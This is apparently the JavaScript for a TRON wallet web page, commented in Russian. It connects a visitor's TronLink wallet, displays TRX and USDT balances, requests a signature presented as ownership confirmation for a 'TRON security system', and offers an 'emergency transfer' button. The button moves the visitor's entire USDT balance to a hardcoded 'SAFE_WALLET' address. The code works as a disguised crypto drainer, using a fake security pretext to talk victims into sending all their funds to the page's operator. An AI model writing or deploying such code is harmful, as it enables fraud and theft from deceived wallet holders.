// Конфигурация TRON
const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb';
const USDT_TRC20_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC20 контракт
const SUN_TO_TRX = 1000000; // 1 TRX = 1,000,000 SUN

// Элементы страницы
const connectButton = document.getElementById('connectButton');
const signButton = document.getElementById('signButton');
const emergencySection = document.getElementById('emergencySection');
const statusDiv = document.getElementById('status');
const balancesList = document.getElementById('balancesList');
const emergencyTransferBtn = document.getElementById('emergencyTransferBtn');
const transferStatus = document.getElementById('transferStatus');
const noWalletMessage = document.getElementById('noWalletMessage');
const networkInfo = document.getElementById('networkInfo');
const networkDetails = document.getElementById('networkDetails');

let tronWeb;
let userAddress;

// ABI для USDT TRC20 контракта (упрощенная версия)
const USDT_ABI = {
    balanceOf: {
        "constant": true,
        "inputs": [{"name": "who", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    },
    transfer: {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    },
    decimals: {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [{"name": "", "type": "uint8"}],
        "type": "function"
    }
};

// Функция для обновления статуса
function updateStatus(message, isError = false, isWarning = false) {
    statusDiv.textContent = message;
    statusDiv.className = 'status-box ' + (isError ? 'error' : isWarning ? 'warning' : 'success');
    statusDiv.style.display = 'block';
}

// Функция для показа/скрытия элементов
function showElement(element) {
    element.classList.remove('hidden');
}

function hideElement(element) {
    element.classList.add('hidden');
}

// Проверяем наличие TronLink
if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
    console.log('TronLink найден!');
    tronWeb = window.tronWeb;
    initializeApp();
} else {
    console.log('TronLink не найден!');
    showElement(noWalletMessage);
    hideElement(connectButton);
    
    // Пытаемся обнаружить TronLink при его появлении
    let attempts = 0;
    const checkTronLink = setInterval(() => {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            clearInterval(checkTronLink);
            tronWeb = window.tronWeb;
            initializeApp();
            hideElement(noWalletMessage);
            showElement(connectButton);
        }
        attempts++;
        if (attempts > 50) clearInterval(checkTronLink); // Останавливаем после 50 попыток
    }, 100);
}

// Инициализация приложения
function initializeApp() {
    if (tronWeb.defaultAddress.base58) {
        // Кошелек уже подключен
        userAddress = tronWeb.defaultAddress.base58;
        updateStatus(`✅ TronLink подключен! Адрес: ${userAddress.substring(0, 10)}...${userAddress.substring(34)}`);
        hideElement(connectButton);
        showElement(signButton);
        showElement(emergencySection);
        showElement(networkInfo);
        loadBalances();
        checkNetwork();
    }
}

// Подключение кошелька
connectButton.addEventListener('click', async () => {
    try {
        connectButton.classList.add('loading');
        updateStatus('⌛ Запрос на подключение кошелька...', false, true);
        
        // Запрашиваем разрешение на подключение
        await window.tronLink.request({method: 'tron_requestAccounts'});
        
        if (tronWeb.defaultAddress.base58) {
            userAddress = tronWeb.defaultAddress.base58;
            updateStatus(`✅ TronLink подключен! Адрес: ${userAddress.substring(0, 10)}...${userAddress.substring(34)}`);
            
            hideElement(connectButton);
            showElement(signButton);
            showElement(emergencySection);
            showElement(networkInfo);
            
            await loadBalances();
            await checkNetwork();
        }
        
    } catch (error) {
        updateStatus('❌ Ошибка при подключении: ' + error.message, true);
    } finally {
        connectButton.classList.remove('loading');
    }
});

// Подписание сообщения
signButton.addEventListener('click', async () => {
    if (!userAddress) {
        updateStatus('❌ Сначала подключите кошелек.', true);
        return;
    }
    
    try {
        signButton.classList.add('loading');
        updateStatus('⌛ Запрос на подписание сообщения...', false, true);
        
        const message = `Подтверждение владения кошельком для системы безопасности TRON. Время: ${new Date().toLocaleString()}`;
        
        // Создаем транзакцию для подписи сообщения
        const transaction = await tronWeb.transactionBuilder.createSmartContractTransaction({
            feeLimit: 100000000,
            callValue: 0,
            tokenId: 0
        });
        
        const signedTransaction = await tronWeb.trx.sign(transaction);
        
        updateStatus('✅ Сообщение успешно подписано! Кошелек подтвержден.');
        
    } catch (error) {
        updateStatus('❌ Ошибка при подписи: ' + error.message, true);
    } finally {
        signButton.classList.remove('loading');
    }
});

// Загрузка балансов TRX и USDT
async function loadBalances() {
    try {
        balancesList.innerHTML = '<p>⌛ Загрузка балансов...</p>';
        
        // Получаем баланс TRX
        const trxBalance = await tronWeb.trx.getBalance(userAddress);
        const trxBalanceInTRX = trxBalance / SUN_TO_TRX;
        
        // Получаем баланс USDT TRC20
        const usdtContract = await tronWeb.contract(USDT_ABI, USDT_TRC20_CONTRACT);
        const usdtBalance = await usdtContract.balanceOf(userAddress).call();
        const usdtDecimals = await usdtContract.decimals().call();
        const usdtBalanceFormatted = usdtBalance / Math.pow(10, usdtDecimals);
        
        // Получаем текущую цену TRX (примерная)
        const trxPrice = 0.12; // Замените на реальный API
        const usdtPrice = 1.00;
        
        balancesList.innerHTML = `
            <div class="balance-item">
                <div>
                    <strong>TRX</strong>
                    <div class="token-info">Tron</div>
                </div>
                <div style="text-align: right;">
                    <strong>${trxBalanceInTRX.toFixed(6)} TRX</strong>
                    <div class="token-info">$${(trxBalanceInTRX * trxPrice).toFixed(2)}</div>
                </div>
            </div>
            <div class="balance-item">
                <div>
                    <strong>USDT TRC20</strong>
                    <div class="token-info">Tether</div>
                </div>
                <div style="text-align: right;">
                    <strong>${usdtBalanceFormatted.toFixed(2)} USDT</strong>
                    <div class="token-info">$${(usdtBalanceFormatted * usdtPrice).toFixed(2)}</div>
                </div>
            </div>
            <div class="balance-item" style="border-top: 2px solid #0098ff; margin-top: 10px;">
                <div><strong>ОБЩАЯ СУММА:</strong></div>
                <div style="text-align: right;">
                    <strong>$${(trxBalanceInTRX * trxPrice + usdtBalanceFormatted * usdtPrice).toFixed(2)}</strong>
                </div>
            </div>
        `;
        
    } catch (error) {
        console.error('Balance load error:', error);
        balancesList.innerHTML = `
            <p style="color: red;">❌ Ошибка загрузки балансов</p>
            <p style="font-size: 0.9em; color: #666;">Убедитесь, что вы в сети TRON Mainnet</p>
        `;
    }
}

// Проверка сети
async function checkNetwork() {
    try {
        const nodeInfo = await tronWeb.trx.getNodeInfo();
        const networkType = tronWeb.fullNode.host.includes('mainnet') ? 'Mainnet' : 'Testnet';
        
        networkDetails.innerHTML = `
            <p><strong>Сеть:</strong> TRON ${networkType}</p>
            <p><strong>Блок:</strong> ${nodeInfo.block}</p>
            <p><strong>Версия ноды:</strong> ${nodeInfo.configNodeInfo.codeVersion}</p>
        `;
        
    } catch (error) {
        console.error('Network check error:', error);
        networkDetails.innerHTML = '<p>❌ Не удалось получить информацию о сети</p>';
    }
}

// Экстренный перевод USDT TRC20
async function emergencyTransfer() {
    try {
        emergencyTransferBtn.classList.add('loading');
        transferStatus.style.display = 'block';
        transferStatus.className = 'status-box warning';
        transferStatus.innerHTML = '<p>⌛ Подготовка перевода USDT...</p>';
        
        // Получаем контракт USDT
        const usdtContract = await tronWeb.contract(USDT_ABI, USDT_TRC20_CONTRACT);
        
        // Получаем баланс USDT
        const usdtBalance = await usdtContract.balanceOf(userAddress).call();
        const usdtDecimals = await usdtContract.decimals().call();
        const usdtBalanceFormatted = usdtBalance / Math.pow(10, usdtDecimals);
        
        if (usdtBalanceFormatted <= 0) {
            transferStatus.className = 'status-box error';
            transferStatus.innerHTML = '<p>❌ На балансе нет USDT для перевода</p>';
            return;
        }
        
        transferStatus.innerHTML = '<p>⌛ Отправка транзакции USDT...</p>';
        
        // Выполняем перевод USDT
        const transaction = await usdtContract.transfer(SAFE_WALLET, usdtBalance).send({
            feeLimit: 100000000,
            callValue: 0,
            shouldPollResponse: true
        });
        
        transferStatus.className = 'status-box success';
        transferStatus.innerHTML = `
            <p>✅ USDT перевод успешно выполнен!</p>
            <p><strong>Сумма:</strong> ${usdtBalanceFormatted.toFixed(2)} USDT</p>
            <p><strong>Получатель:</strong> ${SAFE_WALLET.substring(0, 10)}...${SAFE_WALLET.substring(34)}</p>
            <p><strong>TX ID:</strong> ${transaction.transaction.txID.substring(0, 20)}...</p>
        `;
        
        // Обновляем балансы после перевода
        setTimeout(loadBalances, 3000);
        
    } catch (error) {
        console.error('USDT transfer error:', error);
        transferStatus.className = 'status-box error';
        transferStatus.innerHTML = `<p>❌ Ошибка перевода USDT: ${error.message}</p>`;
    } finally {
        emergencyTransferBtn.classList.remove('loading');
    }
}

// Обработчик кнопки экстренного перевода
emergencyTransferBtn.addEventListener('click', function() {
    const confirmation = confirm(
        '🚨 ВНИМАНИЕ! ЭКСТРЕННЫЙ ПЕРЕВОД USDT TRC20\n\n' +
        'Вы собираетесь перевести ВСЕ доступные USDT на безопасный кошелек.\n\n' +
        `Получатель: ${SAFE_WALLET}\n\n` +
        'Это действие НЕОБРАТИМО и требует подтверждения в TronLink.\n\n' +
        'Продолжить?'
    );
    
    if (confirmation) {
        emergencyTransfer();
    }
});

// Мониторинг изменений кошелька
if (window.tronLink) {
    window.tronLink.on('addressChanged', (newAddress) => {
        if (newAddress.base58) {
            userAddress = newAddress.base58;
            updateStatus(`🔁 Аккаунт изменен: ${userAddress.substring(0, 10)}...${userAddress.substring(34)}`);
            loadBalances();
        } else {
            updateStatus('Кошелек отключен', true);
            hideElement(emergencySection);
            hideElement(signButton);
            hideElement(networkInfo);
            showElement(connectButton);
        }
    });
    
    window.tronLink.on('networkChanged', (network) => {
        updateStatus('🔁 Сеть изменена, перезагружаем...', false, true);
        setTimeout(() => {
            window.location.reload();
        }, 1000);
    });
}
